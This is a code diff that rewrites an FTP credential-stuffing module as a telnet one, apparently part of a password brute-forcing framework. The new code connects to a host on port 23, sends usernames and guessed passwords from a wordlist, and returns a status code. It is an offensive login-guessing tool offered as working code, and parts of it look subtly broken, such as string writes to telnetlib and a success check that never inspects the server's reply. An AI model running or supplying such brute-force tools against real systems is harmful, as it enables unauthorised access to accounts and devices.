@@ -1,28 +1,29 @@
 #!/usr/bin/env python3
 """
-ftp.py
+telnet.py
 
     Module Name:
-        ftp
+        telnet
 
     Author:
         Core Maintainers
 
     Description:
-        Protocol-based module for credential stuffing FTP
+        Protocol-based module for credential stuffing telnet
 """
 
 import dataclasses
-import ftplib
+import telnetlib
 
 from brute.core.protocol import ProtocolBruteforce
 
 
 @dataclasses.dataclass
-class Ftp(ProtocolBruteforce):
+class Telnet(ProtocolBruteforce):
 
-    name = "ftp"
-    port = 21
+    name = "telnet"
+    port = 23
+
 
     @property
     def success(self) -> int:
@@ -30,33 +31,33 @@ class Ftp(ProtocolBruteforce):
 
 
     def init(self):
-        """
-        Initializes the FTP client for interaction.
-        """
-        self.ftp = ftplib.FTP()
-
+        self.telnet = telnetlib.Telnet(self.address)
+        self.telnet.read_until("login: ")
 
     #def sanity(self):
 
 
     def brute(self, username, pwd_guess) -> int:
-        """
-        Returns status code as indicator of success
-        """
         status: int = 0
         try:
-            self.ftp.connect(self.address, self.port)
-            self.ftp.login(username, pwd_guess)
-        except ftplib.error_perm:
+            self.telnet.write(f"{username}\n")
+            self.telnet.read_until("Password: ")
+            self.telnet.write(f"{pwd_guess}\n")
+            self.telnet.write("vt100\n")
+        except EOFError:
             status = -1
 
-        self.ftp.quit()
+        self.telnet.close()
         return status
 
 
+
+
+
+
 if __name__ == "__main__":
-    args = Ftp.parse_args()
-    Ftp(
+    args = Telnet.parse_args()
+    Telnet(
         address = args.address,
         username = args.username,
         wordlist = args.wordlist,
